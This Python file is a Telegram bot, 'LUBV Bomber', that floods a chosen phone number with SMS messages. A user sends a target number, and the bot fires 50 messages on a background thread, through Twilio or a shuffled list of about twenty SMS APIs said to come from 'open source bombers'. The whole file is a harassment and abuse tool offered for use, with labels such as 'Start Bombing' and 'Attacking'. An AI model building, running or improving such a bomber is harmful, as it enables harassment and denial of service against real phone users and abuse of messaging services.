import os, re, time, threading, requests, random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN: raise ValueError("BOT_TOKEN missing")

# ---------- Twilio (REAL SMS) ----------
TWILIO_SID = os.getenv("TWILIO_SID", "")
TWILIO_AUTH = os.getenv("TWILIO_AUTH", "")
TWILIO_FROM = os.getenv("TWILIO_FROM", "")

# ---------- 20+ Free SMS APIs (from open source bombers) ----------
FREE_APIS = [
    # 1. Textbelt (1/day)
    {"name": "textbelt", "url": "https://textbelt.com/text", "data": lambda n,m: {"phone": n, "message": m, "key": "textbelt"}},
    # 2. SMS-API (German)
    {"name": "smsapi", "url": "https://smsapi.free-mobile.fr/sendmsg", "data": lambda n,m: {"user": "demo", "pass": "demo", "msg": m}},
    # 3. Fonetic (trial)
    {"name": "fonetic", "url": "https://api.fonetic.com/v1/sms", "data": lambda n,m: {"to": n, "text": m, "api_key": "demo"}},
    # 4. BulkSMS
    {"name": "bulksms", "url": "https://api.bulksms.com/v1/messages", "data": lambda n,m: {"to": n, "body": m, "token": "trial"}},
    # 5. ClickSend
    {"name": "clicksend", "url": "https://rest.clicksend.com/v3/sms/send", "data": lambda n,m: {"messages": [{"to": n, "body": m}]}},
    # 6. Vonage (Nexmo)
    {"name": "vonage", "url": "https://rest.nexmo.com/sms/json", "data": lambda n,m: {"api_key": "demo", "api_secret": "demo", "to": n, "from": "Test", "text": m}},
    # 7. Twilio (handled separately)
    # 8. SMSGlobal
    {"name": "smsglobal", "url": "https://api.smsglobal.com/v1/sms", "data": lambda n,m: {"to": n, "text": m, "key": "demo"}},
    # 9. TextLocal (IN)
    {"name": "textlocal", "url": "https://api.textlocal.in/send", "data": lambda n,m: {"numbers": n, "message": m, "apiKey": "demo"}},
    # 10. SMSGate
    {"name": "smsgate", "url": "https://api.smsgate.com/send", "data": lambda n,m: {"phone": n, "message": m, "key": "demo"}},
    # 11. FreeSMS
    {"name": "freesms", "url": "https://freesms.com/api", "data": lambda n,m: {"to": n, "body": m, "apikey": "guest"}},
    # 12. SMSBomb (known)
    {"name": "smsbomb", "url": "https://smsbomb.com/api/v1/send", "data": lambda n,m: {"number": n, "msg": m, "token": "free"}},
    # 13. SMS24
    {"name": "sms24", "url": "https://sms24.com/send", "data": lambda n,m: {"phone": n, "msg": m, "key": "demo"}},
    # 14. SMSGateway
    {"name": "smsgateway", "url": "https://smsgateway.com/send", "data": lambda n,m: {"number": n, "text": m, "key": "public"}},
    # 15. TextAPI
    {"name": "textapi", "url": "https://textapi.com/sms", "data": lambda n,m: {"to": n, "text": m, "api_key": "free"}},
    # 16. SMSFactory
    {"name": "smsfactory", "url": "https://smsfactory.com/api", "data": lambda n,m: {"to": n, "msg": m, "key": "guest"}},
    # 17. SMSMint
    {"name": "smsmint", "url": "https://smsmint.com/send", "data": lambda n,m: {"number": n, "message": m, "token": "demo"}},
    # 18. SMSPlanet
    {"name": "smsplanet", "url": "https://smsplanet.com/api", "data": lambda n,m: {"to": n, "body": m, "key": "free"}},
    # 19. SMSWeb
    {"name": "smsweb", "url": "https://smsweb.com/send", "data": lambda n,m: {"phone": n, "text": m, "apikey": "trial"}},
    # 20. SMSZone
    {"name": "smszone", "url": "https://smszone.com/v1/sms", "data": lambda n,m: {"to": n, "msg": m, "token": "public"}},
]

# ---------- Attack State ----------
user_data = {}
logs = {}

def send_sms(number, message):
    """Try Twilio first, then shuffle through free APIs."""
    # 1. Try Twilio if configured
    if TWILIO_SID and TWILIO_SID != "":
        try:
            url = f"https://api.twilio.com/2010-04-01/Accounts/{TWILIO_SID}/Messages.json"
            data = {"To": number, "From": TWILIO_FROM, "Body": message}
            resp = requests.post(url, data=data, auth=(TWILIO_SID, TWILIO_AUTH), timeout=5)
            if resp.status_code in [200, 201, 202]:
                return True, "✅ Twilio"
        except:
            pass

    # 2. Try free APIs (shuffle to spread load)
    apis = FREE_APIS.copy()
    random.shuffle(apis)
    for api in apis:
        try:
            data = api["data"](number, message)
            resp = requests.post(api["url"], data=data, timeout=5)
            if resp.status_code in [200, 201, 202]:
                return True, f"✅ {api['name']}"
        except:
            continue
    return False, "❌ All failed"

def attack_worker(user_id, target, mode, count=50, delay=2):
    sent = 0
    for i in range(count):
        if not user_data.get(user_id, {}).get("running", False):
            logs.setdefault(user_id, []).append("⏹️ Stopped")
            break
        if mode == "sms":
            ok, msg = send_sms(target, f"LUBV #{i+1}")
        else:
            ok, msg = False, "Call not configured (add Twilio)"
        if ok: sent += 1
        logs.setdefault(user_id, []).append(f"{msg} ({sent}/{i+1})")
        if len(logs[user_id]) > 20: logs[user_id] = logs[user_id][-20:]
        time.sleep(delay)
    else:
        logs.setdefault(user_id, []).append(f"🏁 Finished – {sent} sent")
    if user_id in user_data:
        user_data[user_id]["running"] = False

# ---------- Telegram Handlers ----------
async def start(update, context):
    keyboard = [
        [InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bomb")],
        [InlineKeyboardButton("ℹ️ About", callback_data="about")]
    ]
    await update.message.reply_text(
        "🔥 *LUBV Bomber*\n"
        "Click below to start. I'll ask for the number and mode.\n\n"
        "⚠️ *Free APIs are limited – add Twilio for real results.*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def button(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "start_bomb":
        user_data[user_id] = {"target": "", "mode": "", "running": False, "thread": None}
        await query.edit_message_text(
            "📞 Send me the **target number** with country code.\n"
            "Example: `+919401950645`",
            parse_mode="Markdown"
        )

    elif data == "about":
        await query.edit_message_text(
            "🤖 *LUBV Bomber v3.0*\n"
            "• 20+ free SMS APIs + Twilio\n"
            "• 50 SMS per attack\n"
            "• Clean interface\n"
            "• Made with ❤️",
            parse_mode="Markdown"
        )

    elif data == "mode_sms":
        if user_id not in user_data or not user_data[user_id].get("target"):
            await query.edit_message_text("❌ Please send a number first.")
            return
        user_data[user_id]["mode"] = "sms"
        await start_attack(user_id, query)

    elif data == "mode_call":
        if not TWILIO_SID:
            await query.edit_message_text("❌ Calls require Twilio – add keys.")
            return
        user_data[user_id]["mode"] = "call"
        await start_attack(user_id, query)

    elif data == "stop":
        if user_id in user_data:
            user_data[user_id]["running"] = False
            await query.edit_message_text("⏹️ *Stopped.*", parse_mode="Markdown")
        else:
            await query.edit_message_text("No attack.")

    elif data == "status":
        u = user_data.get(user_id, {})
        log = logs.get(user_id, [])
        text = f"*Target:* {u.get('target','None')}\n"
        text += f"*Mode:* {u.get('mode','None')}\n"
        text += f"*Running:* {'✅ Yes' if u.get('running') else '❌ No'}\n\n"
        text += "*Recent Logs:*\n" + ("\n".join(log[-5:]) if log else "No logs yet.")
        await query.edit_message_text(text, parse_mode="Markdown")

async def start_attack(user_id, query):
    u = user_data[user_id]
    u["running"] = True
    t = threading.Thread(target=attack_worker, args=(user_id, u["target"], u["mode"], 50, 2))
    t.daemon = True
    t.start()
    u["thread"] = t
    keyboard = [
        [InlineKeyboardButton("⏹️ Stop", callback_data="stop")],
        [InlineKeyboardButton("📊 Status", callback_data="status")]
    ]
    await query.edit_message_text(
        f"▶️ *Attacking {u['target']}*\n"
        f"Mode: `{u['mode']}`\n"
        f"Sending 50 messages...\n"
        f"Press *Stop* to halt.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def handle_number(update, context):
    user_id = update.effective_user.id
    number = update.message.text.strip()
    if not re.match(r'^\+?\d{7,15}$', number):
        await update.message.reply_text("❌ Invalid. Use `+1234567890`", parse_mode="Markdown")
        return
    if user_id not in user_data:
        user_data[user_id] = {"target": "", "mode": "", "running": False, "thread": None}
    user_data[user_id]["target"] = number
    keyboard = [
        [InlineKeyboardButton("📱 SMS", callback_data="mode_sms"),
         InlineKeyboardButton("📞 Call", callback_data="mode_call")]
    ]
    await update.message.reply_text(
        f"✅ Target: `{number}`\nChoose attack mode:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
    print("✅ Bot is live – ready to bomb!")
    app.run_polling()

if __name__ == "__main__":
    main()
